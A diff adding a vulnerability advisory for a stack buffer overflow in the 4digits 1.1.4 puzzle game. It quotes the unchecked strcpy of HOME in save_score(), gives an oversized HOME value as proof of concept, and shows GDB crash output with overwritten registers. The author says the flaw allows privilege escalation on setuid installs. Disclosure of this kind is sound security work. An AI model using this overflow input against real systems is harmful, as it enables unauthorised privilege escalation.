@@ -1,0 +1,140 @@
+4digits 1.1.4 Local Buffer Overflow Privilege Escalation ( if setuid/setgid )
+
+Discoverd by N_A , N_A [at] tutanota.com
+Downloaded and tested upon Kali Linux
+
+Vendor has been notified.
+
+
+Description
+-------------
+
+4digits is a guess-the-number puzzle game. It's also called Bulls and Cows, and in China people simply call it Guess-the-Number. The game's objective is to guess a four-digit number in 8 times.
+
+https://sourceforge.net/projects/fourdigits/
+
+
+Vulnerability
+--------------
+
+4digits version 1.1.4 and possibly earlier versions suffer from a buffer overflow vulnerability where possible code execution can occur and privileges can be escalated if this is setuid/setgid.
+
+The vulnerability is found within the 4digits-text binary version of the game.
+An environment variable is not checked thoroughly before it is passed to the function save_score() when a user wins at the game. An attacker may be able to execute arbitary code:
+
+4digits-text.c:
+
+/* save current score in the score file */
+void save_score(const int time_taken) {
+    time_t tm = time(NULL);
+    struct tm *today = localtime(&tm);
+    char tmpbuffer[129];
+    today = localtime(&tm);
+    char appdata_dir[4096]; //XXX why _PC_PATH_MAX is only 4?  <----- The buffer we over flow
+    const char *score_filename = "4digits.4digits.scores";
+    strcpy(appdata_dir, getenv("HOME"));    <------ Collecting "HOME"
+    strcat(appdata_dir, "/.4digits/");
+    char *scorefile = (char*)malloc(strlen(appdata_dir) + strlen(score_filename) + 1);
+    if(!scorefile)
+        err_exit(_("Memory allocation error.\n"));
+    strcpy(scorefile, appdata_dir);      <------ Vulnerability here
+    strcat(scorefile, score_filename);
+
+
+The save_score() function is called when the user successfully wins at the game and this is when the vulnerability becomes active, as per example below:
+
+First, set the HOME variable as below
+
+$ export HOME=`perl -e 'print"A"x5100'`
+
+Then , load the game into GDB ( if you want to debug it in real time )
+
+$ gdb 4digits-text
+GNU gdb (Debian 7.10-1+b1) 7.10
+Copyright (C) 2015 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i586-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from 4digits-text...done.
+(gdb) run
+
+
+To activate the bug you must run the game and then win/guess the right number:
+
+
+(gdb) run
+Starting program: /home/N/4digits-1.1.4/4digits-text 
+Input a 4-digit number:1234
+2A0B       7 times left.
+Input a 4-digit number:7934
+1A1B       6 times left.
+Input a 4-digit number:8235
+3A0B       5 times left.
+Input a 4-digit number:8236
+3A0B       4 times left.
+Input a 4-digit number:8239
+3A0B       3 times left.
+Input a 4-digit number:8237
+4A0B       2 times left.
+You win! :) Used 120 sec.
+
+Program received signal SIGSEGV, Segmentation fault.
+__strlen_sse2_bsf () at ../sysdeps/i386/i686/multiarch/strlen-sse2-bsf.S:50
+50  ../sysdeps/i386/i686/multiarch/strlen-sse2-bsf.S: No such file or directory.
+
+
+(gdb) i r
+eax            0x0  0
+ecx            0x1  1
+edx            0x5  5
+ebx            0x13f6  5110
+esp            0xbfffd424  0xbfffd424
+ebp            0xbfffe4f8  0xbfffe4f8
+esi            0x0  0
+edi            0x41414141  1094795585
+eip            0xb7e854b6  0xb7e854b6 <__strlen_sse2_bsf+22>
+eflags         0x10287  [ CF PF SF IF RF ]
+cs             0x73  115
+ss             0x7b  123
+ds             0x7b  123
+es             0x7b  123
+fs             0x0  0
+gs             0x33  51
+
+
+(gdb) backtrace
+#0  __strlen_sse2_bsf () at ../sysdeps/i386/i686/multiarch/strlen-sse2-bsf.S:50
+#1  0x08048f8f in save_score (time_taken=1094795585) at 4digits-text.c:183
+#2  0x41414141 in ?? ()
+#3  0x41414141 in ?? ()
+#4  0x41414141 in ?? ()
+#5  0x41414141 in ?? ()
+#6  0x41414141 in ?? ()
+#7  0x41414141 in ?? ()
+#8  0x41414141 in ?? ()
+#9  0x41414141 in ?? ()
+#10 0x41414141 in ?? ()
+#11 0x41414141 in ?? ()
+#12 0x41414141 in ?? ()
+#13 0x41414141 in ?? ()
+#14 0x41414141 in ?? ()
+#15 0x41414141 in ?? ()
+#16 0x41414141 in ?? ()
+#17 0x41414141 in ?? ()
+#18 0x41414141 in ?? ()
+#19 0x41414141 in ?? ()
+#20 0x41414141 in ?? ()
+#21 0x41414141 in ?? ()
+#22 0x41414141 in ?? ()
+
+
+By N_A , N_A [at] tutanota.com
